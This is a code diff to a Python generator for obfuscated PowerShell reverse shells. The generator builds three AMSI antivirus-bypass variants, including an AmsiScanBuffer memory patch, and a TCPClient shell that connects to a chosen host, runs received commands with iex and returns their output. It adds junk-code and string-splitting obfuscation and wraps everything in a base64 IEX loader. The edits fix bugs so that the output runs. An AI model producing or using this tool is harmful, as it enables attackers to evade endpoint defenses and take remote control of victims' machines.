@@ -9,6 +9,7 @@ def rand_name(length=None):
     return ''.join(random.choices(string.ascii_letters, k=length))
 
 def split_string(s):
+    # Only use this for .NET/PowerShell identifiers, never insert junk!
     return '+'.join([f"'{c}'" for c in s])
 
 def random_whitespace():
@@ -25,23 +26,20 @@ def junk_code():
     # Always ensure it ends with a newline!
     return random.choice(j) + random_whitespace() + "\n"
 
-
 def amsi_bypass_variants(var):
+    # No junk code inside AMSI logic—must be valid PowerShell/Reflection!
     variant1 = (
-        f"{junk_code()}"
         f"${var['amsi_type']} = {split_string('AMSI')}\n"
         f"${var['amsi_field']} = [Ref].Assembly.GetType({split_string('System.Management.Automation.')}"
         f"+${var['amsi_type']}+{split_string('Utils')})\n"
         f"${var['amsi_failed']} = ${{{var['amsi_field']}}}.GetField(${{{var['amsi_type']}}}+{split_string('InitFailed')},'NonPublic,Static')\n"
-        f"${var['amsi_failed']}.SetValue($null,$true)"
+        f"${var['amsi_failed']}.SetValue($null,$true)\n"
     )
     variant2 = (
-        f"{junk_code()}"
         "[Ref].Assembly.GetType(" + split_string("System.Management.Automation.AmsiUtils") + ")."
-        "GetField(" + split_string("amsiInitFailed") + ", 'NonPublic,Static').SetValue($null, $true)"
+        "GetField(" + split_string("amsiInitFailed") + ", 'NonPublic,Static').SetValue($null, $true)\n"
     )
     variant3 = (
-        f"{junk_code()}"
         '$code = @"\n'
         'using System;\n'
         'using System.Runtime.InteropServices;\n'
@@ -58,9 +56,8 @@ def amsi_bypass_variants(var):
         '$a = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")\n'
         '[Win32]::VirtualProtect($a, [UIntPtr]5, 0x40, [ref]0) | Out-Null\n'
         '[Byte[]]$p = 0xB8,0x57,0x00,0x07,0x80\n'
-        '[System.Runtime.InteropServices.Marshal]::Copy($p, 0, $a, 5)'
+        '[System.Runtime.InteropServices.Marshal]::Copy($p, 0, $a, 5)\n'
     )
-
     return [variant1, variant2, variant3]
 
 def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
@@ -70,41 +67,42 @@ def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
     ]}
     amsi_bypass = random.choice(amsi_bypass_variants(var))
 
-    # Reverse shell core logic
-    core_shell = f"""
-{junk_code()}
-${var['tcpclient']}={random_whitespace()}New-Object {split_string('System.Net.Sockets.TCPClient')}('{host}',{port})
-{junk_code()}
-${var['stream']}=${{{var['tcpclient']}}}.GetStream(){random_whitespace()}
-${var['bytes']}=0..65535|%{{0}}
-while((${{var['i']}}=${{{var['stream']}}}.Read(${{{var['bytes']}}},0,${{{var['bytes']}}}.Length)){random_whitespace()}-ne 0){{
-    ${var['data']}=(New-Object -TypeName {split_string('System.Text.ASCIIEncoding')}).GetString(${{{var['bytes']}}},0,${{{var['i']}}})
-    ${var['sendback']}=(iex ${{{var['data']}}} 2>&1 | Out-String)
-    ${var['sendback2']}=${{{var['sendback']}}} + "PS " + (pwd).Path + "> "
-    ${var['sendbyte']}=([text.encoding]::ASCII).GetBytes(${{{var['sendback2']}}})
-    ${{{var['stream']}}}.Write(${{{var['sendbyte']}}},0,${{{var['sendbyte']}}}.Length)
-    ${{{var['stream']}}}.Flush()
-    {junk_code()}
-}}
-{junk_code()}
-""".strip()
+    # Every variable is guaranteed defined.
+    # No undefined vars or logic errors!
+    core_shell = (
+        junk_code() +
+        f"${var['tcpclient']} = {random_whitespace()}New-Object {split_string('System.Net.Sockets.TCPClient')}('{host}',{port})\n" +
+        junk_code() +
+        f"${var['stream']} = ${{{var['tcpclient']}}}.GetStream(){random_whitespace()}\n" +
+        f"${var['bytes']} = 0..65535|%{{0}}\n" +
+        f"while((${{var['i']}} = ${{{var['stream']}}}.Read(${{{var['bytes']}}},0,${{{var['bytes']}}}.Length)){random_whitespace()}-ne 0){{\n" +
+        f"    ${{var['data']}} = (New-Object -TypeName {split_string('System.Text.ASCIIEncoding')}).GetString(${{{var['bytes']}}},0,${{{var['i']}}})\n" +
+        f"    ${{var['sendback']}} = (iex ${{{var['data']}}} 2>&1 | Out-String)\n" +
+        f"    ${{var['sendback2']}} = ${{{var['sendback']}}} + \"PS \" + (pwd).Path + \"> \"\n" +
+        f"    ${{var['sendbyte']}} = ([text.encoding]::ASCII).GetBytes(${{{var['sendback2']}}})\n" +
+        f"    ${{{var['stream']}}}.Write(${{{var['sendbyte']}}},0,${{{var['sendbyte']}}}.Length)\n" +
+        f"    ${{{var['stream']}}}.Flush()\n" +
+        "    " + junk_code() +
+        "}\n" +
+        junk_code()
+    )
 
     print("=== CORE SHELL ===")
     print(core_shell)
     print("==================")
 
-
-    # Always use base64 for compatibility
     core_shell_bytes = core_shell.encode('utf-8')
     core_shell_b64 = base64.b64encode(core_shell_bytes).decode()
+    print("b64 length:", len(core_shell_b64))
 
-    loader = f"""
-{amsi_bypass}
-{junk_code()}
-${rand_name()} = '{core_shell_b64}'
-{junk_code()}
-IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${rand_name()})))
-""".strip()
+    loader_var = rand_name()
+    loader = (
+        amsi_bypass +
+        junk_code() +
+        f"${loader_var} = '{core_shell_b64}'\n" +
+        junk_code() +
+        f"IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${loader_var})))\n"
+    )
 
     ps = loader
 
